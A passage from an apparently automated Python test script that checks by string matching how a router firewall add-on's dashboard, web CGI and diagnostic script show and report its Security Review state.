ok("localStorage" not in between(dash, '<div class="rvb" id="rvb">', "})();</script>", "review bar"), "dashboard: the bar is never dismissed browser-side")
# 2026-10-19: the Security Review posture row - four states from one painter, fed by the bar's poll
pr = between(dash, "function paintReview(){", "\n}\n", "paintReview")
ok('id="s_rv_tag"' in dash and 'data-go="Reaper_Firewall.asp?t=status"' in dash[dash.index('id="s_wdn_tag"'):dash.index('id="s_rv_tag"')],
   "posture: the Security Review row sits after Warden and opens the Status tab")
ok("set(`<#btn_Disabled#>`,'warn'" in pr and "set(`<#RDSH_109#>`,'warn',`<#RDSH_113#>`)" in pr and "set(`<#RDSH_108#>`,'ok'" in pr and "set(`<#RDSH_105#>`,'danger'" in pr,
   "posture: Disabled and No baseline amber, Baseline green, Review red")
# 2026-10-19: no report yet (a boot: the first check can take up to 10 minutes) - a baseline on
# disk keeps the Baseline word in amber instead of claiming "No baseline"; httpd says which
ok("if(j&&j.armed){ set(`<#RDSH_108#>`,'warn',`<#RDSH_116#>`); } else { set(`<#RDSH_109#>`,'warn',`<#RDSH_114#>`); }" in pr,
   "posture: no report yet shows amber Baseline when a baseline is on disk, No baseline otherwise")
ok('"armed":%d,"error":"no report yet"' in c_unescape(cgi) and "lstat(RVIEW_BASE, &bs) == 0 && S_ISREG(bs.st_mode) && bs.st_size > 0" in cgi,
   "web.c: the no-report answer carries armed from the baseline file (regular, non-empty, never a symlink)")
ok("if(!j||!j.ok){ack.classList.add('hidden');st.textContent=(j&&j.rwatch===0)?`<#RFW_338#>`:((j&&j.armed)?`<#RFW_365#>`:`<#RFW_339#>`);return;}" in page,
   "page: no report yet hides Accept and names the pending state (baseline or not)")
ok("innerHTML" not in pr and "'rwatch_review'" in dash and "review:'rwatch_review'" in dash, "posture: textContent only; the switch rides refreshPosture's key list")
ok("window.RVJ=j; if(typeof paintReview==='function')paintReview();" in dash and "paintReview();" in between(dash, "function paintPosture(){", "\n}\n", "paintPosture"),
   "posture: the row repaints from the bar's poll and on every posture refresh")
diag = read("others/reaper_diag")
ok('VER="REAPER-DIAG v1.3.49"' in diag and 'echo "  security review   : rwatch_review=' in diag and 'echo "  threat domains    : rwarden_dns=' in diag,
   "diag v1.3.45: the review and threat-domain state lines")
ok("finding WARN \"security review: ${_rvu} unreviewed change(s)" in diag and "finding WARN \"security review: ${_rvn} failed-login burst(s)" in diag
   and "finding WARN \"threat domains are switched on but no list is loaded" in diag, "diag: findings for unreviewed changes, login bursts and an unloaded domain list")
ok("review.auth" not in between(diag, 'echo "  security review   : rwatch_review=', "\n\n", "diag 12 review block").replace("login_notices", ""), "diag: section 12 prints counts, never the notice sources")

print("PASS: %d checks" % passed)
